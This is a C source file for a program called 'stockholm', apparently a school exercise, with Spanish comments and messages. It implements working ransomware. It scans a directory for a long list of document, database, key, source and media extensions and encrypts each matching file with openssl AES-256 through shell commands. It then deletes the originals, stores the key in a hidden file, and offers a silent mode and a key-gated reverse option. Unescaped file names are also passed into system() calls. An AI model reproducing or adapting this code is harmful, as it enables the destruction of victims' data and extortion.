#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <sys/uio.h>
#include <string.h>
#include <fcntl.h>
#include <time.h>
#include <sys/random.h>
#include <limits.h>
#include <signal.h>
#include <dirent.h>
#include <sys/types.h>

#define GREEN "\x1B[32m"
#define BLUE "\x1B[34m"
#define NORMAL_COLOR "\x1B[0m"

int	encrypt_files(int sil);

/////////////////FUNCIONES LIBFT /////////////////////

char	*ft_strjoin(char const *s1, char const *s2)
{
	char	*str;
	size_t	i;
	size_t	c;

	if (!s1 || !s2)
		return (0);
	str = (char *)malloc(sizeof(char) * (strlen(s1) + strlen(s2) + 1));
	if (!str)
		return (0);
	i = 0;
	while (s1[i])
	{
		str[i] = s1[i];
		i++;
	}
	c = 0;
	while (s2[c])
	{
		str[i + c] = s2[c];
		c++;
	}
	str[i + c] = '\0';
	return (str);
}

char	*itoa(long long n)
{
	char	*str;
	long long	nbr;
	size_t	size;

	nbr = n;
	size = n > 0 ? 0 : 1;
	nbr = nbr > 0 ? nbr : -nbr;
	while (n)
	{
		n /= 10;
		size++;
	}
	if (!(str = (char *)malloc(size + 1)))
		return (0);
	*(str + size--) = '\0';
	while (nbr > 0)
	{
		*(str + size--) = nbr % 10 + '0';
		nbr /= 10;
	}
	if (size == 0 && str[1] == '\0')
		*(str + size) = '0';
	else if (size == 0 && str[1] != '\0')
		*(str + size) = '-';
	return (str);
}

/////////////////FUNCIONES LIBFT /////////////////////



////////////// MENU && CONTROL ERRORS //////////////////////////////////////////////////////

int control_letter(char *s)
{
	char *del = "rm ";
	char *file = ".stockholm.txt";
	int sil = 1;
	int i = 0;

	if (strcmp(s, "-help") == 0 || strcmp(s, "-h") == 0)
	{
		printf("Este programa cuenta con las siguientes opciones:\n\n▶ -help o -h para mostrar la ayuda actual.🆘\n▶ -version o -v para mostrar la version del programa.🆔\n▶ -reverse o -r seguida de la clave introducida como argumento para revertir la infeccion.⏪\n▶ -silent o -s para que el programa no produzca ningun output.🔇\n");
		return (0);
	}
	else if (strcmp(s, "-version") == 0 || strcmp(s, "-v") == 0)
	{
		printf("▶ Version 1.0 ♻️\n");
		return (0);
	}
	else if (strcmp(s, "-silent") == 0 || strcmp(s, "-s") == 0)
	{
		if (access(".stockholm.txt", F_OK) != -1)
		{
			file = ft_strjoin(del, file);
			system(file);
		}
		sil = 1;
		encrypt_files(sil);
		return (0);
	}
	return (-1);
}

int program_name(char *s)
{
	int i = 0;
	int j = 0;
	char *name = "./stockholm";

	while (s[i])
	{
		if (s[i] == name[i])
			j++;
		i++;
	}
	if (i == j)
		return (0);
	return (-1);
}

////////////// MENU && CONTROL ERRORS //////////////////////////////////////////////////////

char *gen_key(int sil)
{
 	int fd;
    int i;
    int l = 0;
    unsigned int ran;
    int x;
    long long result = 0;
    char *resultfinal;

    
    i = 0;
    resultfinal = malloc(sizeof(char) * (16));
    while (i != 16)
    {
        uint32_t new = arc4random();
        x = (((unsigned int)new) % 10);
        result = result * 10;
        result = result + x;
        x += 48;
        i++;
        x = 0;
    }
    resultfinal = itoa(result);
    if (sil == 0)
    	printf("La contraseña para poder llevar a cabo la desencriptacion es: 🔑 %s 🔑 \n\n", resultfinal);
    return (resultfinal);
}

int encrypt_file(char *file, char *key)
{
	char *str = "openssl aes-256-cbc -pass pass:";
	char *str2 = " -in ";
	char *str3 = " -out ";
	char *str4 = ".ft";
	char *del = "rm ";
	int len;

	len = strlen(file);
	if (len > 2 && file[len - 1] == 't' && file[len - 2] == 'f'&& file[len - 3] == '.')
	{
		return (-1);
	}
	else
	{
		str = ft_strjoin(str, key);
		str = ft_strjoin(str, str2);
		str = ft_strjoin(str, file);
		str = ft_strjoin(str, str3);
		str = ft_strjoin(str, file);
		str = ft_strjoin(str, str4);
	}
	system(str);
	del = ft_strjoin(del, file);
	system(del);
	return (0);
}

int		encrypt_files(int sil)
{
	char *path = "/Users/gemartin/Desktop/stock/infection";
	DIR * d = opendir(path);
	char *temp[2000] = {".der", ".pfx", ".key", ".cr", ".csr", ".p12", ".pem", ".od", ".o", ".sxw", ".stw", ".uo", ".3ds", ".max", ".3dm", ".txt", ".ods", ".ots", ".sxc", ".stc", ".dif", ".slk", ".wb2", ".odp", ".otp", ".sxd", ".std", ".uop", ".odg", ".otg", ".sxm", ".mml", ".lay", ".lay6", ".asc", ".sqlite3", ".sqlitedb", ".sql", ".accdb", ".mdb", ".db", ".dbf", ".odb", ".frm", ".myd", ".myi", ".ibd", ".mdf", ".ldf", ".sln", ".suo", ".cs", ".c", ".cpp", ".pas", ".h", ".asm", ".js", ".cmd", ".ba", ".ps1", ".vbs", ".vb", ".pl", ".dip", ".dch", ".sch", ".brd", ".jsp", ".php", ".asp", ".rb", ".java", ".jar", ".class", ".sh", ".mp3", ".wav", ".swf", ".fla", ".wmv", ".mpg", ".vob", ".mpeg", ".asf", ".avi", ".mov", ".mp4", ".3gp", ".mkv", ".3g2", ".flv", ".wma", ".mid", ".m3u", ".m4u", ".djvu", ".svg", ".ai", ".psd", ".nef", ".tiff", ".tif", ".cgm", ".raw", ".gif", ".png", ".bmp", ".jpg", ".jpeg", ".vcd", ".iso", ".backup", ".zip", ".rar", ".7z", ".gz", ".tgz",
						".tar", ".bak", ".tbk", ".bz2", ".PAQ", ".ARC", ".aes", ".gpg", ".vmx", ".vmdk", ".vdi", ".sldm", ".sldx", ".sti", ".sxi", ".602", ".hwp", ".sn", ".onetoc2", ".dwg", ".pdf", ".wk1", ".wks", ".123", ".rtf", ".csv", ".tx", ".vsdx", ".vsd", ".edb", ".eml", ".msg", ".os", ".ps", ".potm", ".potx", ".ppam", ".ppsx", ".ppsm", ".pps", ".po", ".pptm", ".pptx", ".pp", ".xltm", ".xltx", ".xlc", ".xlm", ".xl", ".xlw", ".xlsb", ".xlsm", ".xlsx", ".xls", ".dotx", ".dotm", ".do", ".docm", ".docb", ".docx", ".doc"};
	int i = 0;
	char *key;
	char *str = "chmod 666 ";
	char *file = ".stockholm.txt";
	int fd;

	if (d == NULL)
		return (-1);
	struct dirent * dir;
	key = gen_key(sil);
	while ((dir = readdir(d)) != NULL)
	{
		if(dir-> d_type != DT_DIR)
		{
			i = 0;
			while (temp[i])
			{
				if (strstr(dir->d_name, temp[i]) != NULL)
				{
					if (encrypt_file(dir->d_name, key) == -1)
						break ;
					if (sil == 0)
						printf("▶ El fichero %s se ha encriptado correctamente. 🔐✅\n",dir->d_name);
					break ;
				}
				i++;
			}
		}
		else
			if(dir -> d_type == DT_DIR && strcmp(dir->d_name,".")!=0 && strcmp(dir->d_name,"..")!=0 )
			{
				if (sil == 0)
					printf("▶ El directorio %s no se ha encriptado. 🔓❌\n",dir->d_name);
			}
	}
	i = 0;
	fd = open(".stockholm.txt", O_RDWR | O_TRUNC | O_CREAT);
	str = ft_strjoin(str, file);
	system(str);
    while (key[i])
    {
       write(fd, &key[i], 1);
       i++;
    }
    close(fd);
	free(key);
	closedir(d);
	return (0);
}

int check_extension(char *file)
{
	int len;

	len = strlen(file);
	if (len > 2 && file[len - 1] == 't' && file[len - 2] == 'f'&& file[len - 3] == '.')
	{
		return (0);
	}
	else
		return (-1);
}

char *quit_extension(char *file)
{
	int i = 0;
	int len = strlen(file);
	char *result;

	result = malloc(sizeof(char) * (len - 2));
	while (i != len - 3)
	{
		result[i] = file[i];
		i++;
	}
	result[i] = '\0';
	return(result);
}

int desencrypt_file(char *file, char *key)
{
	char *str = "openssl aes-256-cbc -d -in ";
	char *str2 = " -pass pass:";
	char *str3 = " -out ";
	char *outfile;
	char *del = "rm ";

	outfile = quit_extension(file);
	str = ft_strjoin(str, file);
	str = ft_strjoin(str, str2);
	str = ft_strjoin(str, key);
	str = ft_strjoin(str, str3);
	str = ft_strjoin(str, outfile);
	system(str);
	del = ft_strjoin(del, file);
	system(del);
	return (0);
}

int ft_reverse(char *key)
{
	char *path = "/Users/gemartin/Desktop/stock/infection";
	DIR * d = opendir(path);

	if (d == NULL)
		return (-1);
	struct dirent * dir;
	while ((dir = readdir(d)) != NULL)
	{
		if(dir-> d_type != DT_DIR)
		{
			if (check_extension(dir->d_name) == -1)
				;
			else
			{
				if (desencrypt_file(dir->d_name, key) == -1)
					printf("▶ El fichero %s no se ha desencriptado. 🔐❌\n",dir->d_name);
				else
					printf("▶ El fichero %s se ha desencriptado correctamente. 🔓✅\n",dir->d_name);
			}
		}
	}
	closedir(d);
	return (0);
}

int check_key(char *key)
{
	char *result;
	int rid = 1;
	int fd;
	int i = 0;

	fd = open(".stockholm.txt", O_RDONLY);
    result = malloc(sizeof(char) * (16 + 1)); 
    rid = read(fd, result, 16);
    if (rid == -1)
    {
        free(result);
        return (-1);
    }
    result[16] = '\0';
    close(fd);
    if (strcmp(result, key) == 0)
    	return(0);
    else
    	return (-1);
}

int main(int argc, char **argv)
{
	char *del = "rm ";
	char *file = ".stockholm.txt";

	if (argc == 1)
	{
		if (access(".stockholm.txt", F_OK) != -1)
		{
			file = ft_strjoin(del, file);
			system(file);
		}
		if (program_name(argv[0]) == -1)
		{
			printf("Introduce el nombre de programa correcto. 🤬\n");
			return (-1);
		}
		if (encrypt_files(0) == -1)
		{
			printf("No se han podido encriptar los ficheros. ❌\n");
			return (-1);
		}
		return (0);
	}
	if (argc != 2 && argc != 1 && argc != 3) 
	{
		printf("Argumentos no validos. ❌\n");
		return (- 1);
	}
	else if (argc == 2)
	{
		if (program_name(argv[0]) == -1)
		{
			printf("Introduce el nombre de programa correcto. 🤬\n");
			return (- 1);
		}
		if (control_letter(argv[1]) == -1)
		{
			printf("Prueba con un comando valido. ❌\n");
			return (-1);
		}
	}
	else if (argc == 3)
	{
		if (program_name(argv[0]) == -1)
		{
			printf("Introduce el nombre de programa correcto. 🤬\n");
			return (- 1);
		}
		if (strcmp(argv[1], "-r") == 0 || strcmp(argv[1], "-reverse") == 0)
		{
			if (check_key(argv[2]) == -1)
			{
				printf("La clave de desencriptacion no es la correcta. 🔑❌\n");
				return (-1);
			}
			if (ft_reverse(argv[2]) == -1)
			{
				printf("No se han podido desencriptar los archivos. ❌\n");
				return (-1);
			}
		}
		else
		{
			printf("Prueba con un comando valido. ❌\n");
			return(-1);
		}
	}
	return (0);
}
